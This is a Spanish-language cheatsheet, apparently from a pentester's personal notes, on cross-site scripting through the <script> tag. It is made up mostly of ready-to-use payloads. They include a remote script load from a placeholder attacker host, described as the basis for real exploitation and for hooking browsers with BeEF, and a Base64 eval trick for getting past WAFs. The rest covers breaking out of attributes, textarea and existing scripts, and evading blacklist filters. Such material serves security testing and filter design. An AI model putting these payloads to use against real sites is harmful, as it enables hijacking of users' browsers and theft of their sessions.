---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Etiqueta `<script>` Estándar

***

## Cheatsheet

| **Propósito del Vector**                   | **Contexto / Notas de Uso**                                                                                                                             | **Payload Específico**                             |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| PoC (Proof of Concept) básica.             | Verifica de forma inmediata si las etiquetas de apertura y cierre son interpretadas por el navegador.                                                   | `<script>alert(1)</script>`                        |
| Ejecución de script remoto (Out-of-Band).  | Fundamental para la explotación real. Permite cargar payloads complejos, bypass de limitación de caracteres y conexión con herramientas como BeEF.      | `<script src="https://ev.il/xss.js"></script>`     |
| Declaración explícita del tipo MIME.       | Útil al interactuar con analizadores web (parsers) más antiguos o estrictos que requieren el atributo `type` para procesar el bloque.                   | `<script type="text/javascript">alert(1)</script>` |
| Alteración del flujo de carga.             | Aprovecha atributos estándar de HTML5. A veces los filtros buscan la cadena exacta `<script>`, y añadir atributos lícitos puede evadir reglas simples.  | `<script defer>alert(1)</script>`                  |
| Ofuscación del cuerpo del script (Base64). | Permite ocultar el código malicioso (ej. `alert(1)`) de los filtros (WAF) que analizan el contenido entre las etiquetas, sin alterar la etiqueta en sí. | `<script>eval(atob('YWxlcnQoMSk='))</script>`      |

### Ruptura de Contextos Existentes

Cuando la entrada no se refleja en el cuerpo general del HTML, sino dentro de otras estructuras preexistentes, es mandatorio escapar o cerrar ese entorno antes de inyectar la etiqueta `<script>`.

- **Salida de Atributos HTML:** Si el reflejo ocurre dentro del valor de un atributo (ej. un `<input>`), se debe cerrar la cadena y la etiqueta base:
    `"><script>alert(1)</script>`
- **Salida de Bloques de Texto Protectores:** Etiquetas como `<textarea>`, `<title>` o `<xmp>` tratan todo su contenido como texto sin formato. Es necesario cerrarlas explícitamente:
    `</textarea><script>alert(1)</script>`
- **Inyección dentro de un Script Existente:** Si el reflejo aterriza dentro de un bloque de JavaScript legítimo, la forma más segura de tomar el control es cerrar el script original y abrir uno nuevo, neutralizando errores de sintaxis:
    `';}</script><script>alert(1)</script>`


### Modificaciones para Evasión de Filtros Simples

Si el sistema bloquea el payload básico pero no implementa un bloqueo de caracteres especiales (como `<` o `>`), estas variaciones de la etiqueta `<script>` suelen ser efectivas contra listas negras superficiales:
- **Alternancia de Mayúsculas y Minúsculas:** `<sCrIpT>alert(1)</ScRiPt>` (aprovecha la tolerancia de HTML).
- **Inclusión de Espacios Nulos o Blancos:** `<script >alert(1)</script>` o `<script/src="http://x.js"></script>` (rompe expresiones regulares mal diseñadas que buscan `<script>` sin variaciones de espaciado).


***

## Overview

La inyección de la etiqueta `<script>` representa la forma más clásica, directa y fundamental de ejecutar un ataque de [[XSS]]. Este vector asume que la aplicación web refleja la entrada en el [[DOM]] permitiendo la estructura de etiquetas HTML y que no neutraliza de forma explícita la palabra clave `script`.

El objetivo aquí no es depender de manejadores de eventos (como `onerror` o `onload`), sino forzar al motor de renderizado del navegador a abrir un nuevo contexto de ejecución de JavaScript y procesar el código suministrado de forma inmediata.


***

